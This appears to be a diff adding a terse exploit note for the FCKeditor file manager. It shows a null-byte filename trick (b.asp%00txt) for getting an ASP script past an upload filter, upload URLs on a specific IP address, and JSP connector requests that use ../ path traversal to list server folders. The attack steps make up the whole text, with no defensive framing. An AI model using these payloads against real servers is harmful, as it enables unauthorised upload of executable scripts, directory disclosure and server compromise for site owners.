@@ -1,0 +1,14 @@
+1.b.asp.txt ----¡÷  b.asp%00txt ----¡÷  b.asp%00txt[URL decode] ----¡÷  b.asp_txt   
+http://61.64.51.253/upload/file/b.asp_txt
+
+2. do action 1 again.
+http://61.64.51.253/upload/file/b(1).asp
+http://61.64.51.253/upload/file/b(2).asp
+......
+
+3.jsp connector--------
+/jcms/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector.jsp?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F&uuid=1382418753604
+/jcms/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector.jsp?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F../../../../&uuid=1382418861715
+/jcms/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector.jsp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=%2F&uuid=1382411364510
+/jcms/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector.jsp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=../../
+/jcms/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=File&CurrentFolder=../../../
